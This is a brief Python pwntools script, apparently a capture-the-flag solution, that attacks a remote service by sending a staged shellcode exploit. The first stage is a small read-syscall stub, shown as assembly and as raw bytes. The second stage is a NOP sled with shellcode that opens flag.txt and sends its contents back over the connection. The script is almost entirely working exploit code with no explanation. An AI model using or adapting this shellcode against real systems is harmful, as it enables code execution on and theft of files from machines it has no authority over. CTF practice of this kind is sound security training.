from pwn import *
context(os='linux', arch='amd64', log_level='debug')
payload1='''
    xor eax, eax
    mov rsi,rdi
    xor rdi, rdi
    mov edx, 0xFF 
    syscall
    ''' 

payload1=b'1\xc0H\x89\xfeH1\xff\xba\xff\x00\x00\x00\x0f\x05'


payload2=b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90j\x01\xfe\x0c$H\xb8flag.txtPj\x02XH\x89\xe71\xf6\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05'

#payload2=b'\x90'*20+asm(shellcraft.cat("flag.txt"))

print(len(payload1),payload1)
print(payload2)
p=remote("13.238.150.105",35679)
p.sendafter('bytes!\n',payload1)
p.send(payload2)
print(p.recvall())
